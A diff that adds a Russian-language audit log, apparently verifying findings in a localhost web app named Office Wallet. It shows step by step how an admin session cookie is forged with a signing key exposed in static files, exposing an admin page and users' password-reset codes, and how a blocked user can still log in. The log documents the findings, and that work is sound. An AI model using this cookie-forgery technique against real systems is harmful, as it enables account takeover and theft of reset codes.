@@ -1,0 +1,59 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-28
+################################################################################################
+--- проверка 1/2 ---
+== 2. OW-28/OW-35: фейк админ-куки: роль в подписи, ключ в статике ==
+    · При входе сервер собирает куку ow.<uid>.<роль>.<HMAC-SHA256(SESSION_KEY, uid:роль>).
+    · Роль входит в подписываемую строку, но после проверки подписи с базой не сверяется
+    · (auth.go:40-43). Сам SESSION_KEY — константа, её отдаёт статика приложения,
+    · поэтому подпись считаем сами и подставляем себе роль admin. Пароль не нужен.
+    → SQL SELECT id FROM users WHERE login='adminw'
+    ← psql 6
+    HMAC-SHA256(office-wallet-session-key, '6:admin') = c59d80997f788119de7c...
+    → GET /admin/secrets  Cookie: ow_session=ow.6.admin.<hmac>
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Служебное · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"...
+    ┌─ АРТЕФАКТ · OW-28/OW-35 · поддельная админ-сессия
+    │ подписанное значение: ow.6.admin.<HMAC>
+    │ GET /admin/secrets → HTTP 200; в ответе найден заголовок админки
+    └─
+[+] админка открыта без пароля
+    · Та же кука открывает SMS-шлюз — там коды сброса паролей всех пользователей
+    · (админская страница, handlers_auth.go:158-179).
+    → GET /gateway/sms  (коды сброса паролей всех пользователей)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>SMS-шлюз · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">...
+    код подтверждения сброса 144105
+    код подтверждения сброса 486357
+    код подтверждения сброса 914206
+    ┌─ АРТЕФАКТ · OW-28 · SMS-коды доступны под поддельной ролью
+    │ GET /gateway/sms → HTTP 200; извлечено строк кодов: 3
+    └─
+
+--- проверка 2/2 ---
+== 5. OW-28: блокировка пользователя не работает ==
+    · Бухгалтер может заблокировать сотрудника — флаг blocked есть в базе и в сессии
+    · читается, но нигде не проверяется: ни при входе, ни дальше по работе
+    · (auth.go:17-44, в handlers_auth.go проверки вообще нет). То есть блокировка —
+    · это косметика: человек продолжает работать, пока сам не выйдет.
+    → SQL SELECT blocked FROM users WHERE login='ivanov'
+    ← psql f
+    → SQL UPDATE users SET blocked=TRUE WHERE login='ivanov' RETURNING login, blocked;
+    ← psql ivanov|t
+    UPDATE 1
+    → POST /login  login=ivanov (куки → Client)
+    ← HTTP 302 redirect=http://localhost:18081/  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Обзор · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+    → SQL SELECT blocked FROM users WHERE login='ivanov'
+    ← psql t
+    ┌─ АРТЕФАКТ · OW-28 · blocked=true не запрещает аутентификацию
+    │ users.blocked: f → t
+    │ POST /login ivanov/workplace1 → HTTP 302; сессия выдана
+    └─
+[+] заблокированный всё равно входит
+    ← старая сессия тоже жива: HTTP 200
+    → SQL UPDATE users SET blocked=FALSE WHERE login='ivanov' RETURNING login, blocked;
+    ← psql ivanov|f
+    UPDATE 1
+    → SQL SELECT blocked FROM users WHERE login='ivanov'
+    ← psql f
+    после теста blocked=f
+    ivanov разблокирован обратно
